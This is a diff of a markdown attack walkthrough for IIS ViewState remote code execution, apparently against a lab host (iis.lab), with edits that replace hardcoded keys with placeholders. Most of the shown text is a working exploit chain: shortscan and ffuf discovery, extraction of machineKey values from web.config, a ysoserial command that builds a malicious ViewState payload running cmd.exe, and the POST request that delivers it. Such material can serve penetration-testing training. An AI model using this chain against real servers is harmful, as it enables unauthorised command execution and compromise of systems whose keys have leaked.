@@ -1,5 +1,7 @@
 ## IIS ViewState RCE - Attack Walkthrough
 
+Diagrams: https://excalidraw.com/#json=j-Qcjq63BfafKheNgsjx8,vFyzZrPr4TWZ07ybqBxvWg
+
 ### Step 1: Discover Files with Shortscan
 
 Run shortscan against the target to find exposed files and shortnames:
@@ -44,10 +46,6 @@ ffuf -u http://iis.lab/main/FUZZ -w wordlist.txt
 Once you have `web.config`, locate these values:
 
 
-
-
-
-
 ```xml
 <machineKey
   validationKey="KEY"
@@ -79,10 +77,8 @@ Use ysoserial to craft a ViewState payload that executes a command:
 <input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="" />
 
 
-
-
 ```powershell
-.\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd.exe /c whoami > C:\Windows\Temp\pwned.txt" --validationkey=CB2721ABDAF8E9DC516D621D8B8BF13A2C9E868FEA8B4F7D8C8F8F8F8F8F8F8F —decryptionkey=ABCD1234567890ABCD1234567890ABCD --validationalg="SHA1" --decryptionalg="AES" --generator=9EB1435B --path="/main/home.aspx" --apppath="/main/"
+.\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd.exe /c whoami > C:\Windows\Temp\pwned.txt" --validationkey=<KEY> —decryptionkey=<KEY> --validationalg="SHA1" --decryptionalg="AES" --generator=9EB1435B --path="/main/home.aspx" --apppath="/main/"
 ```
 
 **Parameters explained:**
@@ -112,7 +108,7 @@ POST /main/home.aspx HTTP/1.1
 Host: iis.lab
 Content-Type: application/x-www-form-urlencoded
 
-__VIEWSTATE=<PAYLOAD_HERE>&__VIEWSTATEGENERATOR=CA0B0334&Button1=Refresh+Session
+__VIEWSTATE=<PAYLOAD_HERE>&__VIEWSTATEGENERATOR=VIEWSTATEGENERATOR&Button1=Refresh+Session
 ```
 
 Send the request. The server will deserialize your malicious ViewState and execute your command.
